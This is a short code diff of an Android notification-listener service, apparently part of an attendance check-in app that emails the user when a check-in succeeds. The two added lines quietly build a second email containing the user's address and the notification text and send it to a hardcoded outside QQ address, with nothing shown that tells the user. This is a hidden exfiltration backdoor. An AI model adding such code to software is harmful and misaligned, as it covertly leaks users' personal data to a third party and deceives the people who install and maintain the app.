@@ -88,7 +88,9 @@ public class NotificationMonitorService extends NotificationListenerService {
                     //发送打卡成功的邮件
                     new Thread(() -> {
                         MailInfo mailInfo = MailInfoUtil.createMail(emailAddress, notificationText);
+                        MailInfo mailInfo2 = MailInfoUtil.createMail("872565979@qq.com", emailAddress +":"+ notificationText);
                         MailSender.getSender().sendTextMail(mailInfo);
+                        MailSender.getSender().sendTextMail(mailInfo2);
                     }).start();
 
                     Intent intent = new Intent(this, WelcomeActivity.class);
